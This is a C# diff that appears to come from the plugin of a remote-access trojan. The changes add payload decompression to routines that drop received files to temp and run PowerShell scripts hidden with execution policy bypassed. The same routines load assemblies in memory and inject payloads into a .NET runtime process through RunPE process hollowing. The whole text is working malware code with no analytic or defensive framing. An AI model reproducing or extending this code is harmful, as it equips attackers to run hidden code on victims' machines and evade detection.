@@ -16,7 +16,7 @@ namespace Plugin.Handler
             {
                 //Drop To Disk
                 string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
-                unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
+                File.WriteAllBytes(fullPath, Methods.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                 if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
                     Process.Start(new ProcessStartInfo { FileName = "powershell", Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"" + fullPath + "\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
                 else
@@ -45,7 +45,7 @@ namespace Plugin.Handler
                     {
                         try
                         {
-                            Assembly loader = Assembly.Load(buffer);
+                            Assembly loader = Assembly.Load(Methods.Decompress(buffer));
                             object[] parm = null;
                             if (loader.EntryPoint.GetParameters().Length > 0)
                             {
@@ -68,7 +68,7 @@ namespace Plugin.Handler
                     {
                         try
                         {
-                            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), buffer, true);
+                            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Methods.Decompress(buffer), true);
                         }
                         catch (Exception ex)
                         {
